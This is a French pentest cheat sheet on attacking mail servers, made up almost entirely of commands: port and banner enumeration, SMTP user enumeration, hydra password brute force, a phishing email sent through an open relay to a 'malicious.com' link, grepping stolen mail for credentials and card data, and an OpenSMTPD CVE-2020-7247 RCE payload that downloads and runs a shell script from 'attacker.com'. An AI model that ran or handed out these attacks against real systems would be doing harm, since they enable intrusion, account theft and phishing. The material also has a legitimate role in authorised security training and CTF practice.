# SMTP/POP3/IMAP (25,110,143/TCP)

Les services de messagerie permettent l'envoi (SMTP) et la réception (POP3/IMAP) d'emails.
## 🔍 Énumération
### Scan de base
```bash
# Scan des ports email
sudo nmap -sV -p 25,110,143,465,587,993,995 $IP

# Scripts Nmap spécifiques
nmap --script=smtp-* -p 25,465,587 $IP
nmap --script=pop3-* -p 110,995 $IP
nmap --script=imap-* -p 143,993 $IP
```
### Identification des MX records
```bash
# Recherche des enregistrements MX pour un domaine
host -t MX domain.com
dig mx domain.com | grep "MX" | grep -v ";"
```
### Récupération de bannière
```bash
# SMTP
nc -vn $IP 25

# POP3
nc -vn $IP 110

# IMAP
nc -vn $IP 143
```
## 🔨 Exploitation
### Énumération d'utilisateurs
```bash
# Commande VRFY en SMTP
telnet $IP 25
VRFY root
VRFY admin

# Commande RCPT TO
telnet $IP 25
MAIL FROM:test@example.com
RCPT TO:admin

# Automatisation avec smtp-user-enum
smtp-user-enum -M VRFY -U users.txt -D domain.com -t $IP
smtp-user-enum -M RCPT -U users.txt -D domain.com -t $IP
```
### Authentification par force brute
```bash
# SMTP
hydra -l [user] -P /usr/share/wordlists/rockyou.txt $IP smtp

# POP3
hydra -l [user] -P /usr/share/wordlists/rockyou.txt $IP pop3

# IMAP
hydra -l [user] -P /usr/share/wordlists/rockyou.txt $IP imap
```
### Relais SMTP (Open Relay)
```bash
# Test de relais ouvert
nmap -p25 --script smtp-open-relay $IP

# Envoi d'email via relais ouvert
swaks --from attacker@example.com --to victim@example.com \
  --header 'Subject: Important Security Update' \
  --body 'Please click: http://malicious.com' \
  --server $IP
```
### Accès aux emails
```bash
# POP3 - Lister et récupérer des emails
telnet $IP 110
USER username
PASS password
LIST
RETR 1

# IMAP - Lister et récupérer des emails
telnet $IP 143
a LOGIN username password
a LIST "" "*"
a SELECT INBOX
a FETCH 1 BODY[]
```
## 🔐 Post-exploitation

### Recherche d'informations sensibles
```bash
# Rechercher des mots de passe, informations PII dans les emails
grep -i -E "password|credential|username|ssn|credit.?card" emails.txt

# Rechercher des liens de réinitialisation de mot de passe
grep -i "reset|recover|password" emails.txt
```
### Exploitation de vulnérabilités spécifiques
```bash
# CVE-2020-7247 (OpenSMTPD RCE)
# Exploitation de la vulnérabilité OpenSMTPD
nc $IP 25
HELO test
MAIL FROM:<;for i in $(seq 1 100);do read;done;sh;exit 0;>
RCPT TO:<root>
DATA
cd /tmp
wget http://attacker.com/shell.sh
chmod +x shell.sh
./shell.sh
.
```
## ⚠️ Erreurs courantes & astuces
- Beaucoup de serveurs SMTP limitent les commandes VRFY/EXPN
- Les serveurs modernes ont souvent une protection anti-relay
- Vérifiez les ports alternatifs (587, 465) si 25 est bloqué
- Les services cloud (O365, Gmail) ont souvent des protections supplémentaires

### Techniques d'énumération SMTP tirées de CTFs réels
#### Énumération d'utilisateurs via SMTP VRFY (Reel)
Le protocole SMTP peut être utilisé pour valider l'existence d'utilisateurs:
```bash
# Connexion manuelle au serveur SMTP
nc -nv 10.10.10.x 25

# Commandes SMTP pour l'énumération
HELO example.com
MAIL FROM: <attacker@example.com>
RCPT TO: <utilisateur@domaine.cible>
```
Si l'utilisateur existe, vous recevrez une réponse "250 OK". Sinon, "550 Unknown user".
Cette technique permet de valider des listes d'utilisateurs potentiels sans déclencher d'alertes de tentatives d'authentification échouées.
#### Énumération SMTP automatisée
Utilisation d'outils spécialisés pour automatiser l'énumération:
```bash
# Avec smtp-user-enum
smtp-user-enum -M VRFY -U userlist.txt -t 10.10.10.x

# Avec metasploit
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS 10.10.10.x
set USER_FILE /path/to/userlist.txt
run
```
L'avantage de cette méthode est qu'elle est souvent négligée dans la sécurisation des environnements, car les administrateurs se concentrent davantage sur les protocoles d'authentification comme SMB ou RDP.